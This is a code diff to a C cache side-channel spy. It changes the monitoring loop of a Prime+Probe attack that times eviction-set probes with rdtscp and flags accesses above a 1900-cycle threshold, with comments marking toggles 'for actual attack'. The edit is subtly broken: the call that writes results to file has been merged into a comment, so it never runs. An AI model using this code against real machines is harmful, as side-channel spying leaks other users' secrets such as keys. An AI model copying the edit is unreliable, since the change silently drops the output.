@@ -161,10 +161,10 @@ void close_spy(Config *conf, Targets *targets){
 
 // Monitor target addresses.
 void my_monitor(Config *spy_conf, Targets *targets){
+    const char *output_filename = "./output_prime_probe.log";
     {
-        const char *output_filename = "./output_prime_probe.log";
-        int ctr=0, *hit_ctr=malloc(targets->number*sizeof(int));
-        for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
+        
+        int ctr=0;
         unsigned long long old_tsc, tsc;
         __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
 
@@ -181,23 +181,19 @@ void my_monitor(Config *spy_conf, Targets *targets){
             // probe
             for(size_t i=0; i<targets->number; i++){
                 targets->addresses[i]->msrmts[ctr]=probe_evset_chase(spy_conf, targets->addresses[i]->evset);
-            }
+            }   
 
-            // probe
-            for(size_t i=0; i<targets->number; i++){
-                if(first>0) printf("%lu, 0x%lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
-                if(first-->0) list_print(targets->addresses[i]->evset);
-                // probe_evset_chase(spy_conf, targets->addresses[i]->evset);
-                // Maybe toggle during actual attack.
-                // if(targets->addresses[i]->msrmts[ctr] > 1900) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
-            }        
-
-            if(ctr++ >= MSRMT_BUFFER) {
-                ctr=0;
-                // Write results to file
-                append_output(targets, output_filename);
-                break; // toggle for actual attack
-            }
+            if(ctr++ >= MSRMT_BUFFER) break; // toggle for actual attack
+            
+        }
+    }
+    // Write results to fileappend_output(targets, output_filename);
+    #define PP_THRESHOLD 1900
+    int *hit_ctr=malloc(targets->number*sizeof(int));
+    for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
+    for(int j=0; j<MSRMT_BUFFER; j++){
+        for(size_t i=0; i<targets->number; i++){
+            if(targets->addresses[i]->msrmts[j] > PP_THRESHOLD) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, j, ++hit_ctr[i]);
         }
     }
     printf("finished\n");
